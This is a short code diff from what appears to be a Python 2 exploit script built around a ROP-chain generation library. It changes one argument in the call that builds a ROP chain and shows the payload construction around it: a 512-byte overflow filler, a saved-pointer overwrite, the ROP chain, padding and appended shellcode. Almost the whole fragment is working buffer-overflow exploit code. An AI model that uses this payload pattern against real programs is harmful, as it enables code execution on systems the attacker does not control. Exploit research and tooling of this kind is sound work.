@@ -54,7 +54,7 @@ if len(sys.argv) < 2: # manual mode
   )
 else:
   print "Using automatically built ROP chain"
-  rop = ropme.rop_to_shellcode([(filename, None, 0)], [], target_address, archinfo.ArchAMD64(), logging.DEBUG, True)
+  rop = ropme.rop_to_shellcode([(filename, None, None)], [], target_address, archinfo.ArchAMD64(), logging.DEBUG, True)
 
 payload = 'A'*512 + 'B'*8 + rop
 payload += ((1024 - len(payload)) * 'B') + shellcode
